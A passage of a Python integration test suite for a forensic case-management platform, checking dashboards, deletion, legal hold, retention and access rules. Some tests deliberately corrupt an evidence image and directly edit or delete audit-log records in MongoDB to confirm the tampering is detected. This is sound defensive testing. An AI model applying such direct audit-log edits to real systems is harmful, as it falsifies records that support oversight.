    check('viewer cannot cancel jobs (403)', post(f'/api/jobs/{jid}/cancel', C['VIEWER']).status == 403)
    j3 = wait_job(inv, post(f"/api/jobs/analysis/{C['B_E']}", inv).json['job_id'])
    check('the evidence can be analysed again after a cancel', j3['status'] == 'COMPLETED', j3.get('error'))


@section('28 Overview counts')
def t_overview():
    inv, A, E = C['INVESTIGATOR'], C['A'], C['E']
    o = get(f'/api/cases/{A}/overview', inv).json
    c = o['counts']
    q = lambda p: get(p, inv).json
    exp = {
        'evidence': 1, 'evidence_analyzed': 1,
        'files': q(f'/api/forensics/evidence/{E}/files?limit=1')['total'],
        'deleted_files': q(f'/api/forensics/evidence/{E}/files?deleted=true&limit=1')['total'],
        'timeline_events': q(f'/api/forensics/timeline?case_id={A}&limit=1')['total'],
        'browser_history': q(f'/api/forensics/browser?case_id={A}&limit=1')['total'],
        'browser_downloads': q(f'/api/forensics/browser?case_id={A}&kind=BROWSER_DOWNLOAD&limit=1')['total'],
        'usb_devices': len(q(f'/api/forensics/usb?case_id={A}')['data']),
        'programs_run': q(f'/api/forensics/activity?case_id={A}&kind=PROGRAM_RUN&limit=1')['total'],
        'recent_files': q(f'/api/forensics/activity?case_id={A}&kind=RECENT_FILE&limit=1')['total'],
        'recycle_bin_items': q(f'/api/forensics/activity?case_id={A}&kind=RECYCLE_BIN_ITEM&limit=1')['total'],
        'findings': len(q(f'/api/findings?case_id={A}')['data']),
        'tags': q(f'/api/tags?case_id={A}')['total'],
        'reports': len(q(f'/api/reports?case_id={A}')['data']),
        'custody_events': len(q(f'/api/chain?case_id={A}')['data']),
        'renamed_files': q(f'/api/forensics/flagged?case_id={A}&kind=renamed&limit=1')['total'],
        'encrypted_files': q(f'/api/forensics/flagged?case_id={A}&kind=encrypted&limit=1')['total'],
        'known_bad_files': q(f'/api/forensics/flagged?case_id={A}&kind=known_bad&limit=1')['total'],
        'notable_files': q(f'/api/forensics/flagged?case_id={A}&kind=notable&limit=1')['total'],
        'found_data': q(f'/api/forensics/entities?case_id={A}&limit=1')['total'],
        'archive_members': q(f'/api/forensics/evidence/{E}/files?members=true&limit=1')['total'],
        'browser_searches': q(f'/api/forensics/browser?case_id={A}&kind=BROWSER_SEARCH&limit=1')['total'],
        'browser_cookies': q(f'/api/forensics/browser?case_id={A}&kind=BROWSER_COOKIE&limit=1')['total'],
        'browser_bookmarks': q(f'/api/forensics/browser?case_id={A}&kind=BROWSER_BOOKMARK&limit=1')['total'],
        'browser_autofill': q(f'/api/forensics/browser?case_id={A}&kind=BROWSER_AUTOFILL&limit=1')['total'],
        'browser_logins': q(f'/api/forensics/browser?case_id={A}&kind=BROWSER_LOGIN&limit=1')['total'],
        'browser_recovered': q(f'/api/forensics/browser?case_id={A}&kind=BROWSER_RECOVERED&limit=1')['total'],
        'email_stores': len(q(f'/api/forensics/email/stores?case_id={A}')['data']),
        'email_messages': q(f'/api/forensics/email/messages?case_id={A}&limit=1')['total'],
        'chat_messages': q(f'/api/forensics/chat-cloud?case_id={A}&type=CHAT_MESSAGE&limit=1')['total'],
        'chat_calls': q(f'/api/forensics/chat-cloud?case_id={A}&type=CHAT_CALL&limit=1')['total'],
        'chat_file_transfers': q(f'/api/forensics/chat-cloud?case_id={A}&type=CHAT_FILE_TRANSFER&limit=1')['total'],
        'chat_contacts': q(f'/api/forensics/chat-cloud?case_id={A}&type=CHAT_CONTACT&limit=1')['total'],
        'chat_apps': q(f'/api/forensics/chat-cloud?case_id={A}&type=CHAT_APP&limit=1')['total'],
        'cloud_accounts': q(f'/api/forensics/chat-cloud?case_id={A}&type=CLOUD_ACCOUNT&limit=1')['total'],
        'cloud_files': q(f'/api/forensics/chat-cloud?case_id={A}&type=CLOUD_FILE&files_only=true&limit=1')['total'],
        'pictures': q(f'/api/forensics/media?case_id={A}&kind=picture&limit=1')['total'],
        'videos': q(f'/api/forensics/media?case_id={A}&kind=video&limit=1')['total'],
        'media_with_gps': q(f'/api/forensics/media?case_id={A}&gps=true&limit=1')['total'],
        'ocr_files': q(f'/api/forensics/media?case_id={A}&text=true&limit=1')['total'],
        'programs': q(f'/api/forensics/executables?case_id={A}&limit=1')['total'],
        'programs_flagged': q(f'/api/forensics/executables?case_id={A}&flagged=true&limit=1')['total'],
        'shadow_files': q(f'/api/forensics/shadow-copies?case_id={A}&limit=1')['total'],
    }
    check('email attachments are counted', c.get('email_attachments') == 1, c.get('email_attachments'))
    diff = {k: (c.get(k), v) for k, v in exp.items() if c.get(k) != v}
    check('every overview count equals the matching list', not diff, diff)
    check('overview lists recent jobs', len(o['jobs']) >= 1)


ACTIVITY_EVENT_TYPES = ('BROWSER_VISIT,BROWSER_DOWNLOAD,USB_ACTIVITY,PROGRAM_RUN,RECENT_FILE_OPENED,FILE_DELETED_TO_RECYCLE_BIN,'
                        'PROGRAM_RUN_USERASSIST,PROGRAM_RUN_BAM,FOLDER_BROWSED,EXPLORER_SEARCH,TYPED_PATH,RECENT_DOC_OPENED,RUN_DIALOG,RDP_CONNECTION,'
                        'LOGON,LOGOFF,JUMPLIST_OPENED,TIMELINE_ACTIVITY,FILE_DOWNLOADED,BROWSER_SEARCH,EMAIL_SENT,CHAT_CALL,CHAT_FILE_TRANSFER,'
                        'PHONE_MESSAGE,PHONE_CALL,HTTP_REQUEST')


@section('28b Activity dashboard')
def t_dashboard():
    inv, A = C['INVESTIGATOR'], C['A']
    dash = lambda extra='': get(f'/api/cases/{A}/dashboard{extra}', inv)
    events = get(f'/api/forensics/timeline?case_id={A}&type={ACTIVITY_EVENT_TYPES}&limit=2000', inv).json['data']

    def truth(offset_minutes):
        cells = {}
        for e in events:
            t = iso(e['timestamp']) + timedelta(minutes=offset_minutes)
            cells[(t.isoweekday(), t.hour)] = cells.get((t.isoweekday(), t.hour), 0) + 1
        return cells
    d = dash().json
    check('heatmap covers exactly the user-activity events', d['heatmap']['total'] == len(events) == sum(x['total'] for x in d['per_day']) > 0,
          (d['heatmap']['total'], len(events)))
    check('UTC heatmap: every weekday x hour cell equals the timeline', {(a, b): n for a, b, n in d['heatmap']['cells']} == truth(0), d['heatmap']['cells'])
    for tz, offset in (('Asia/Kolkata', 330), ('America/New_York', -240), ('%2B05%3A30', 330)):
        cells = {(a, b): n for a, b, n in dash(f'?tz={tz}').json['heatmap']['cells']}
        check(f'heatmap in {tz.replace("%2B", "+").replace("%3A", ":")} equals the timeline shifted by {offset} minutes', cells == truth(offset), cells)
    check('an unknown or malformed time zone is refused (400)', dash('?tz=Mars/Phobos').status == 400 and dash('?tz=%27bad%27').status == 400)
    all_scope = dash('?scope=all').json
    check('including filesystem times counts every timeline event', all_scope['heatmap']['total'] ==
          get(f'/api/forensics/timeline?case_id={A}&limit=1', inv).json['total'], all_scope['heatmap']['total'])

    hosts = {}
    for r in get(f'/api/forensics/browser?case_id={A}&kind=BROWSER_HISTORY', inv).json['data']:
        h = re.sub(r'^www\.', '', re.match(r'^[a-z]+://([^/:]+)', r['url']).group(1))
        hosts.setdefault(h, [0, 0])
        hosts[h][0] += r.get('visit_count') or 0
        hosts[h][1] += 1
    check('top websites equal the browser history (visits and pages per site)',
          {x['host']: [x['visits'], x['pages']] for x in d['top_domains']['data']} == hosts, d['top_domains'])

    ext = {}
    for e in C['TRUTH']:
        if e['virtual'] or e['mode'].startswith('d'):
            continue
        m = re.search(r'\.([A-Za-z0-9]{1,10})$', e['path'].rsplit('/', 1)[-1])
        key = m.group(1).lower() if m else '(none)'
        ext[key] = ext.get(key, 0) + 1
    ft = d['file_types']
    check('file types equal the Sleuth Kit listing (count per extension)',
          all(ext.get(x['extension']) == x['count'] for x in ft['data']) and sum(x['count'] for x in ft['data']) + ft['other']['count'] == sum(ext.values()),
          (ft, ext))

    usb = {u['serial']: u for u in get(f'/api/forensics/usb?case_id={A}', inv).json['data']}
    spans = {s['serial']: s for s in d['usb_spans']}
    fields = ('setupapi_first_install', 'first_install', 'last_install', 'last_arrival', 'last_removal', 'eventlog_first_connected',
              'eventlog_last_connected', 'eventlog_last_removed')
    check('USB lanes: one per device, spanning its first and last recorded time', set(spans) == set(usb) and all(
        iso(spans[s]['first']) == min(iso(usb[s][f]) for f in fields if usb[s].get(f)) and
        iso(spans[s]['last']) == max(iso(usb[s][f]) for f in fields if usb[s].get(f)) for s in usb), spans)
    check('another investigator gets 404', get(f'/api/cases/{A}/dashboard', C['INV2']).status == 404)


@section('29 Evidence tampering is detected')
def t_tamper():
    inv = C['INVESTIGATOR']
    case = C['TAMPER_CASE'] = post('/api/cases', inv, {'name': 'Tamper test'}).json['case_id']
    r = upload(inv, case, IMG.read_bytes(), 'tamper.dd').json
    eid, p = r['evidence_id'], Path(r['storage_path'])
    os.chmod(p, 0o644)
    with p.open('r+b') as f:   # change one byte deep inside the image
        f.seek(40 * 1024 * 1024)
        b = f.read(1)
        f.seek(40 * 1024 * 1024)
        f.write(bytes([b[0] ^ 0xFF]))
    os.chmod(p, 0o444)
    v = post(f'/api/evidence/{eid}/verify', inv).json
    check('re-verification reports INTEGRITY_FAILED after a one-byte change', v['verification_status'] == 'INTEGRITY_FAILED'
          and v['current_sha256'] != v['sha256'], v)
    j = wait_job(inv, post(f'/api/jobs/analysis/{eid}', inv).json['job_id'])
    check('analysis refuses tampered evidence', j['status'] == 'FAILED' and 'no longer matches' in (j.get('error') or ''), (j['status'], j.get('error')))
    hv = wait_job(inv, post(f'/api/jobs/verify/{eid}', inv).json['job_id'])
    check('background verification also reports INTEGRITY_FAILED', hv.get('result', {}).get('status') == 'INTEGRITY_FAILED', hv.get('result'))
    cust = [c for c in get(f'/api/chain?case_id={case}', inv).json['data'] if c['action'] == 'EVIDENCE_VERIFIED']
    check('the failed verification is in the chain of custody', any(c.get('status') == 'INTEGRITY_FAILED' for c in cust), cust[:2])
    rep = post(f'/api/reports?case_id={case}', inv)
    if rep.status == 200:
        (OUT / 'report-tamper.pdf').write_bytes(get(f"/api/reports/{rep.json['report_id']}/download", inv).body)
    os.chmod(p, 0o644)
    p.unlink()
    check('verification of a missing original is a clear 409', post(f'/api/evidence/{eid}/verify', inv).status == 409)


@section('30 Audit log tampering is detected')
def t_audit_tamper():
    import pymongo
    db = pymongo.MongoClient(os.environ['MONGODB_URI'])['dfip']
    target = db.audit_logs.find_one({'action': 'EVIDENCE_UPLOADED'}, sort=[('sequence', 1)])
    db.audit_logs.update_one({'_id': target['_id']}, {'$set': {'metadata.sha256': '0' * 64}})
    v = get('/api/chain/verify', C['ADMIN']).json
    check('editing one audit record breaks the chain at that record', v['valid'] is False and v['broken_sequence'] == target['sequence'], v)
    db.audit_logs.update_one({'_id': target['_id']}, {'$set': {'metadata.sha256': target['metadata']['sha256']}})
    check('restoring the original value makes the chain valid again', get('/api/chain/verify', C['ADMIN']).json['valid'] is True)
    victim = db.audit_logs.find_one({'action': 'CASE_CREATED'}, sort=[('sequence', 1)])
    db.audit_logs.delete_one({'_id': victim['_id']})
    v2 = get('/api/chain/verify', C['ADMIN']).json
    check('deleting an audit record breaks the chain', v2['valid'] is False, v2)
    db.audit_logs.insert_one(victim)
    check('re-inserting it restores a valid chain', get('/api/chain/verify', C['ADMIN']).json['valid'] is True)


@section('31 Deleting evidence')
def t_delete():
    import glob
    import pymongo
    db = pymongo.MongoClient(os.environ['MONGODB_URI'])['dfip']
    inv, data = C['INVESTIGATOR'], IMG.read_bytes()
    case = post('/api/cases', inv, {'name': 'Deletion test'}).json['case_id']
    ev = upload(inv, case, data, 'to-delete.dd').json
    eid, original = ev['evidence_id'], Path(ev['storage_path'])
    path = f'/api/evidence/{eid}'
    reason = 'Uploaded to the wrong case'
    job = post(f'/api/jobs/analysis/{eid}', inv, {'profile': 'full'}).json['job_id']  # with a content index and found data
    busy = req('DELETE', path, inv, {'reason': 'Deleting during the analysis'})
    check('deletion is refused (409) while an analysis of the image is queued or running', busy.status == 409 and job in (busy.detail or ''), busy)
    wait_job(inv, job)
    files = get(f'/api/forensics/evidence/{eid}/files?deleted=true', inv).json['data']
    pay = next(d for d in files if d['path'].endswith('payroll-export.csv'))
    post(f"/api/forensics/evidence/{eid}/recover?inode={pay['inode']}&offset={pay['partition_offset']}", inv)
    post(f'/api/forensics/evidence/{eid}/carve?engine=photorec', inv, timeout=1800)
    post('/api/findings', inv, {'case_id': case, 'title': 'Linked to the deleted image', 'description': 'x', 'evidence_ids': [eid]})
    tagged = post('/api/tags', inv, {'case_id': case, 'item_type': 'FILE', 'item_id': pay['_id'], 'note': 'on the image to delete'})
    rep = post(f'/api/reports?case_id={case}', inv).json
    results = ('fs_entries', 'timeline_events', 'forensic_artifacts', 'usb_artifacts', 'entities', 'email_messages')
    before = {c: db[c].count_documents({'evidence_id': eid}) for c in results}
    stored = [p for p in glob.glob(f'/app/storage/analysis/*/{eid}') + glob.glob(f'/app/storage/analysis/members/mail/{eid}') if os.path.isdir(p)]
    text_index = Path(f'/app/storage/analysis/text/{eid}.sqlite')
    indexed = text_index.is_file()
    check('viewer cannot delete evidence (403)', req('DELETE', path, C['VIEWER'], {'reason': 'Not allowed here'}).status == 403)
    check('analyst cannot delete evidence (403)', req('DELETE', path, C['ANALYST'], {'reason': 'Not allowed here'}).status == 403)
    check('another investigator cannot delete it (404)', req('DELETE', path, C['INV2'], {'reason': 'Not my case'}).status == 404)
    check('a reason is required (422 without one or with only spaces)',
          req('DELETE', path, inv, {}).status == 422 and req('DELETE', path, inv, {'reason': '      '}).status == 422)
    r = req('DELETE', path, inv, {'reason': reason})
    check('the case investigator deletes the evidence', r.status == 200 and (r.json or {}).get('deleted') is True and not r.json.get('warnings'), r)
    check('it is gone from the evidence detail and list', get(path, inv).status == 404
          and all(e['evidence_id'] != eid for e in get('/api/evidence', inv).json['data']))
    left = {c: db[c].count_documents({'evidence_id': eid}) for c in results}
    check('every analysis result taken from the image is removed', all(before.values()) and not any(left.values()), (before, left))
    check('its analysis jobs are removed', db.jobs.count_documents({'payload.evidence_id': eid}) == 0)
    check('tags on its items are removed', tagged.status == 200 and r.json['removed'].get('tags') == 1
          and not get(f'/api/tags?case_id={case}', inv).json['data'], (tagged, r.json.get('removed')))
    check('the stored image and its recovered, carved, pipeline and email-attachment files are removed',
          len(stored) >= 4 and any(p.endswith(f'/mail/{eid}') for p in stored) and not original.exists() and not any(os.path.exists(p) for p in stored), stored)
    check('its content index is removed', indexed and not text_index.exists(), (indexed, text_index.exists()))
    fnd = next(x for x in get(f'/api/findings?case_id={case}', inv).json['data'] if x['title'] == 'Linked to the deleted image')
    check('a finding that cited it is kept, without the link', eid not in (fnd.get('evidence_ids') or []) and r.json['findings_unlinked'] == 1, fnd)
    cust = get(f'/api/chain?case_id={case}', inv).json['data']
    d = [c for c in cust if c['evidence_id'] == eid and c['action'] == 'EVIDENCE_DELETED']
    check('custody keeps its history and records the deletion with reason, person and hash',
          any(c['evidence_id'] == eid and c['action'] == 'EVIDENCE_REGISTERED' for c in cust)
          and d and d[0].get('reason') == reason and d[0].get('user_name') == 'Demo Investigator' and d[0].get('sha256') == C['IMG_SHA256'], d)
    au = db.audit_logs.find_one({'action': 'EVIDENCE_DELETED', 'metadata.evidence_id': eid})
    check('the deletion is in the audit log and the hash chain stays valid',
          au and au['metadata'].get('reason') == reason and get('/api/chain/verify', C['ADMIN']).json['valid'] is True, au and au.get('metadata'))
    check('a report generated before the deletion is kept', get(f"/api/reports/{rep['report_id']}/download", inv).status == 200)
    again = upload(inv, case, data, 'to-delete.dd')
    check('the image can be registered again afterwards, under a new ID', again.status == 200 and again.json['evidence_id'] != eid, again)
    if C.get('E01_E'):
        wc = Path(f"/app/storage/analysis/working/{C['E01_E']}.raw")
        existed = wc.exists()
        r2 = req('DELETE', f"/api/evidence/{C['E01_E']}", inv, {'reason': 'E01 test finished'})
        check('deleting an E01 also removes its raw working copy', existed and r2.status == 200 and not wc.exists(), (existed, r2))
    if C.get('BDE_E') and C.get('BDE_DERIVED'):
        dv = db.evidence.find_one({'evidence_id': C['BDE_DERIVED']}) or {}
        dfile = Path(dv.get('storage_path') or '/nonexistent')
        had = dfile.exists() and db.fs_entries.find_one({'evidence_id': C['BDE_DERIVED']}) and db.volume_keys.find_one({'evidence_id': C['BDE_E']})
        r3 = req('DELETE', f"/api/evidence/{C['BDE_E']}", inv, {'reason': 'Encrypted volume test finished'})
        check('deleting evidence deletes the evidence decrypted from it too: its file and folder, its results, the stored key; '
              'custody records both deletions', had and r3.status == 200 and r3.json.get('derived_deleted') == [C['BDE_DERIVED']]
              and not dfile.exists() and not dfile.parent.exists() and not db.evidence.find_one({'evidence_id': C['BDE_DERIVED']})
              and not db.fs_entries.find_one({'evidence_id': C['BDE_DERIVED']}) and not db.volume_keys.find_one({'evidence_id': C['BDE_E']})
              and db.chain_of_custody.find_one({'evidence_id': C['BDE_DERIVED'], 'action': 'EVIDENCE_DELETED', 'reason': {'$regex': 'derived from'}}), r3)
    if C.get('SPLIT_E'):
        sv = db.evidence.find_one({'evidence_id': C['SPLIT_E']}) or {}
        parts = [Path(f['path']) for f in sv.get('image_files') or []]
        wc = Path(f"/app/storage/analysis/working/{C['SPLIT_E']}.raw")
        had = parts and all(p.exists() for p in parts) and wc.exists()
        r4 = req('DELETE', f"/api/evidence/{C['SPLIT_E']}", inv, {'reason': 'Split image test finished'})
        check('deleting an image set removes every part, its folder and its working copy', had and r4.status == 200
              and not any(p.exists() for p in parts) and not parts[0].parent.exists() and not wc.exists(), r4)
    if C.get('VSS_E'):
        had = db.shadow_files.count_documents({'evidence_id': C['VSS_E']})
        r5 = req('DELETE', f"/api/evidence/{C['VSS_E']}", inv, {'reason': 'Shadow copy test finished'})
        check('deleting evidence removes its shadow copy records', had and r5.status == 200 and r5.json['removed'].get('shadow_files') == had
              and not db.shadow_files.count_documents({'evidence_id': C['VSS_E']}), r5)
    if again.status == 200:
        ad = req('DELETE', f"/api/evidence/{again.json['evidence_id']}", C['ADMIN'], {'reason': 'Administrator clean-up'})
        check('an administrator can delete evidence in any case', ad.status == 200, ad)


@section('31b Legal hold')
def t_legal_hold():
    import pymongo
    db = pymongo.MongoClient(os.environ['MONGODB_URI'])['dfip']
    inv = C['INVESTIGATOR']
    case = post('/api/cases', inv, {'name': 'Legal hold test'}).json['case_id']
    ev = upload(inv, case, os.urandom(1024 * 1024), 'held.dd').json['evidence_id']
    hold = lambda body, tok=inv: post(f'/api/cases/{case}/legal-hold', tok, body)
    held = lambda: (get(f'/api/cases/{case}', inv).json.get('legal_hold') or {}).get('active')
    reason = 'Litigation hold requested by counsel'
    check('a reason is required (422 without one or with only spaces)',
          hold({'active': True}).status == 422 and hold({'active': True, 'reason': '      '}).status == 422)
    check('viewer and analyst cannot place a hold (403)', hold({'active': True, 'reason': reason}, C['VIEWER']).status == 403
          and hold({'active': True, 'reason': reason}, C['ANALYST']).status == 403)
    check('another investigator cannot place a hold on this case (404)', hold({'active': True, 'reason': reason}, C['INV2']).status == 404)
    r = hold({'active': True, 'reason': reason})
    lh = (r.json or {}).get('legal_hold') or {}
    check('the case investigator places the hold, recorded with reason, person and time',
          r.status == 200 and lh.get('active') is True and lh.get('reason') == reason and lh.get('set_by_name') == 'Demo Investigator' and lh.get('set_at'), r)
    check('placing it again is 409', hold({'active': True, 'reason': 'Once more, please'}).status == 409)
    d = req('DELETE', f'/api/evidence/{ev}', inv, {'reason': 'Trying while held'})
    check('evidence cannot be deleted while the case is under legal hold (423)',
          d.status == 423 and 'legal hold' in (d.detail or '') and get(f'/api/evidence/{ev}', inv).status == 200, d)
    ad = req('DELETE', f'/api/evidence/{ev}', C['ADMIN'], {'reason': 'Administrator trying while held'})
    check('...not even by an administrator', ad.status == 423, ad)
    patch(f'/api/cases/{case}', inv, {'legal_hold': {'active': False}, 'description': 'Edited while held'})
    check('editing the case cannot release the hold', held() is True)
    now = datetime.now(timezone.utc).isoformat()
    post('/api/desktop/sync/push', inv, {'device_id': 'x', 'records': [{
        'record_type': 'case_update', 'record_id': 'lh-1', 'case_id': case, 'data': {'legal_hold': {'active': False}, 'description': 'Offline edit'},
        'local_created_at': now, 'local_modified_at': now, 'device_id': 'x'}]})
    check('an offline update from the desktop app cannot release it either', held() is True)
    check('releasing needs a reason too (422)', hold({'active': False}).status == 422)
    rel = hold({'active': False, 'reason': 'Matter closed by counsel'})
    rl = (rel.json or {}).get('legal_hold') or {}
    check('the hold is released, keeping the original reason and who released it and why',
          rel.status == 200 and rl.get('active') is False and rl.get('reason') == reason and rl.get('release_reason') == 'Matter closed by counsel'
          and rl.get('released_by_name') == 'Demo Investigator', rel)
    check('releasing again is 409', hold({'active': False, 'reason': 'Already released'}).status == 409)
    check('after the release the evidence can be deleted', req('DELETE', f'/api/evidence/{ev}', inv, {'reason': 'Hold released'}).status == 200)
    acts = [a['action'] for a in db.audit_logs.find({'action': {'$in': ['LEGAL_HOLD_PLACED', 'LEGAL_HOLD_RELEASED']}, 'metadata.case_id': case}).sort('sequence', 1)]
    check('placing and releasing are in the audit log and the chain stays valid',
          acts == ['LEGAL_HOLD_PLACED', 'LEGAL_HOLD_RELEASED'] and get('/api/chain/verify', C['ADMIN']).json['valid'] is True, acts)


# ============================================================ OTHER PHASES
@section('31c Retention: closed cases, the daily check and deleting a case')
def t_retention():
    from bson import ObjectId
    adm, inv = C['ADMIN'], C['INVESTIGATOR']
    db = mongo()
    check('the daily check is scheduled (Celery beat, 02:00 UTC)', 'dfip.retention_check' in sh('python', '-c',
          "from app.celery_app import celery_app; print(celery_app.conf.beat_schedule['retention-check']['task'])").stdout.decode())
    check('only administrators see and set the policy (403)', get('/api/admin/retention', inv).status == 403
          and req('PUT', '/api/admin/retention', inv, {'enabled': True, 'days': 1}).status == 403)
    p = req('PUT', '/api/admin/retention', adm, {'enabled': True, 'days': 30})
    check('the administrator keeps closed cases for 30 days (audited)', p.status == 200 and p.json['policy']['days'] == 30
          and db.audit_logs.find_one({'action': 'RETENTION_POLICY_SET'}) is not None, p)
    R = post('/api/cases', inv, {'name': 'Closed matter', 'priority': 'LOW'}).json['case_id']
    up = upload(inv, R, os.urandom(1 << 20), 'closed.dd').json
    stored = Path(up['storage_path'])
    post('/api/findings', inv, {'case_id': R, 'title': 'Old finding', 'description': 'x', 'evidence_ids': [up['evidence_id']]})
    item = post('/api/physical', inv, {'case_id': R, 'description': 'USB stick', 'kind': 'USB drive', 'location': 'Room A'}).json
    post(f"/api/physical/{item['item_id']}/custody", inv, {'action': 'CHECK_OUT', 'person': 'Lab', 'purpose': 'Imaging'})
    c1 = patch(f'/api/cases/{R}', inv, {'status': 'COMPLETED'}).json
    due = iso(c1['retention']['due_at'])
    closed = iso(c1['closed_at'])
    check('closing the case starts its retention period: due 30 days after it was closed',
          c1.get('closed_at') and abs((due - closed) - timedelta(days=30)) < timedelta(seconds=1), c1.get('retention'))
    c2 = patch(f'/api/cases/{R}', inv, {'status': 'IN_PROGRESS'}).json
    c3 = patch(f'/api/cases/{R}', inv, {'status': 'ARCHIVED'}).json
    check('reopening ends it; archiving starts it again', 'retention' not in c2 and 'closed_at' not in c2 and c3.get('retention'), (c2.get('retention'), c3.get('retention')))
    run = post('/api/admin/retention/run', adm).json
    check('not due yet: the check lists nothing for it', R not in run['due'], run)
    db.cases.update_one({'case_id': R}, {'$set': {'retention.due_at': datetime.now(timezone.utc) - timedelta(days=1)}})  # thirty days later
    run = post('/api/admin/retention/run', adm).json
    notes = [n for n in get('/api/notifications', adm).json['data'] if n['title'] == 'Cases due for deletion']
    again = post('/api/admin/retention/run', adm).json
    check('once due, the check notifies the administrators (once a day, not on every run) and lists it',
          R in run['due'] and R in run['notified'] and notes and R in notes[0]['message'] and R in again['due'] and R not in again['notified']
          and any(c['case_id'] == R for c in get('/api/admin/retention', adm).json['due']), (run, again))
    post(f'/api/cases/{R}/legal-hold', inv, {'active': True, 'reason': 'Appeal lodged'})
    held = post('/api/admin/retention/run', adm).json
    d = req('DELETE', f'/api/cases/{R}', adm, {'confirm': R, 'reason': 'Retention period ended'})
    check('under legal hold the case is held, not due, and cannot be deleted (423)', R in held['held'] and R not in held['due'] and d.status == 423, (held, d))
    post(f'/api/cases/{R}/legal-hold', inv, {'active': False, 'reason': 'Appeal dismissed'})
    check('deleting needs the case number typed (400) and the administrator\'s permission (investigator 403)',
          req('DELETE', f'/api/cases/{R}', adm, {'confirm': 'CASE-0000-000', 'reason': 'Retention period ended'}).status == 400
          and req('DELETE', f'/api/cases/{R}', inv, {'confirm': R, 'reason': 'Retention period ended'}).status == 403)
    held_item = req('DELETE', f'/api/cases/{R}', adm, {'confirm': R, 'reason': 'Retention period ended'})
    check('physical evidence still checked out blocks the deletion (409)', held_item.status == 409 and item['item_id'] in (held_item.detail or ''), held_item)
    post(f"/api/physical/{item['item_id']}/custody", inv, {'action': 'CHECK_IN', 'location': 'Room A', 'seal_intact': True})
    post(f"/api/physical/{item['item_id']}/custody", inv, {'action': 'RELEASE', 'person': 'The owner'})
    d = req('DELETE', f'/api/cases/{R}', adm, {'confirm': R, 'reason': 'Retention period ended'})
    custody = db.chain_of_custody.find_one({'evidence_id': up['evidence_id'], 'action': 'EVIDENCE_DELETED'}) or {}
    check('the case is deleted: its evidence file, findings and physical records go; the case remains as a deleted record; custody and audit keep it',
          d.status == 200 and d.json['removed']['evidence'] == 1 and d.json['removed']['findings'] == 1 and d.json['removed']['physical_items'] == 1
          and not stored.exists() and get(f"/api/evidence/{up['evidence_id']}", inv).status == 404 and get(f'/api/cases/{R}', adm).status == 404
          and all(c['case_id'] != R for c in get('/api/cases', adm).json['data'])
          and any(c['case_id'] == R and c['reason'] == 'Retention period ended' for c in get('/api/admin/retention', adm).json['deleted'])
          and custody.get('reason') == 'Case deleted: Retention period ended'
          and db.audit_logs.find_one({'action': 'CASE_DELETED', 'metadata.case_id': R}) is not None, (d, custody))
    req('PUT', '/api/admin/retention', adm, {'enabled': True, 'days': 2555})


@section('32 Desktop-only writes (REQUIRE_DESKTOP_FOR_WRITES=true)')
def t_desktop_writes():
    check('/health reports desktop-only writes', get('/health').json.get('require_desktop_for_writes') is True)
    inv = token_of('investigator@dfip.local')
    r = post('/api/cases', inv, {'name': 'From the web'})
    check('web request to create a case is refused (403, read-only portal)', r.status == 403 and 'desktop' in r.detail.lower(), r)
    check('reads still work from the web', get('/api/cases', inv).status == 200)
    dev = f'ws-{uuid.uuid4().hex[:8]}'
    reg = post('/api/desktop/register', inv, {'device_id': dev, 'device_name': 'WS', 'app_version': '2.1.0', 'os': 'windows'}).json
    hdr = {'X-DFIP-Device-Id': dev, 'X-DFIP-Device-Token': reg['device_token']}
    ok = post('/api/cases', inv, {'name': 'From the desktop app'}, headers=hdr)
    check('the same request from a registered workstation succeeds', ok.status == 200, ok)
    bad = post('/api/cases', inv, {'name': 'Mismatched device'}, headers={'X-DFIP-Device-Id': 'other', 'X-DFIP-Device-Token': reg['device_token']})
    check('device ID that does not match the token is refused', bad.status == 403, bad)
    an = token_of('analyst@dfip.local')
    stolen = post('/api/cases', an, {'name': 'Stolen token'}, headers=hdr)
    check("another user's workstation token is refused", stolen.status == 403, stolen)
    case = ok.json['case_id'] if ok.status == 200 else None
    if case:
        f = post('/api/findings', inv, {'case_id': case, 'title': 'Web finding', 'description': 'x'})
        check('web finding creation refused', f.status == 403, f)
        rep = post(f'/api/reports?case_id={case}', inv)
        check('web report generation refused', rep.status == 403, rep)
        sp = post('/api/desktop/sync/push', inv, {'device_id': 'x', 'records': [{'record_type': 'finding', 'record_id': 'w1', 'case_id': case,
              'data': {'case_id': case, 'title': 'Web sync finding', 'description': 'x'}, 'local_created_at': datetime.now(timezone.utc).isoformat(),
              'local_modified_at': datetime.now(timezone.utc).isoformat(), 'device_id': 'x'}]})
        made = any(x['title'] == 'Web sync finding' for x in get(f'/api/findings?case_id={case}', inv).json['data'])
        check('sync push from the web cannot write either', not made, sp)


@section('33 Open registration (REGISTRATION_MODE=open)')
def t_reg_open():
    check('/health reports open registration', get('/health').json.get('registration_mode') == 'open')
    email = f'open.{uuid.uuid4().hex[:6]}@test.local'
    r = post('/api/auth/register', body={'name': 'Open User', 'email': email, 'password': 'Open-Registration-1'})
    check('account is active immediately', r.status == 201 and r.json['status'] == 'ACTIVE', r)
    li = login(email, 'Open-Registration-1')
    check('new user signs in as INVESTIGATOR', li.status == 200 and li.json['user']['role'] == 'INVESTIGATOR', li)
    t = li.json['access_token']
    check("new user sees no one else's cases", get('/api/cases', t).json['data'] == [])


@section('34 Registration turned off (REGISTRATION_MODE=disabled)')
def t_reg_disabled():
    check('/health reports registration disabled', get('/health').json.get('registration_mode') == 'disabled')
    r = post('/api/auth/register', body={'name': 'Nobody', 'email': f'n.{uuid.uuid4().hex[:6]}@test.local', 'password': 'Disabled-Registration-1'})
    check('register is refused (403) with an explanation', r.status == 403 and 'administrator' in r.detail, r)


PHASES = {
    'main': [t_platform, t_samples, t_auth, t_register, t_cases, t_rbac, t_evidence, t_analysis, t_modules, t_filesystem, t_source,
             t_recovery, t_viewer, t_timeline,
             t_browser, t_usb, t_activity, t_computer, t_fileproc, t_content, t_containers, t_registry, t_eventlogs, t_user_activity, t_user_activity_samples, t_ntfs, t_ntfs_samples, t_email, t_chat_cloud, t_browser_depth,
             t_comms_samples, t_media, t_malware, t_disk_formats, t_encrypted_volumes, t_shadow_copies, t_packages, t_unix, t_more_filesystems, t_plaso, t_network, t_phones,
             t_indicators, t_carving, t_search, t_findings, t_tags, t_review, t_physical, t_graph_summary, t_claude, t_analyst, t_reports, t_audit, t_notifications,
             t_admin, t_desktop, t_websocket, t_misc, t_e01, t_bad_images, t_cancel, t_overview, t_dashboard, t_tamper, t_audit_tamper, t_delete, t_legal_hold, t_retention],
    'desktop_writes': [t_desktop_writes],
    'reg_open': [t_reg_open],
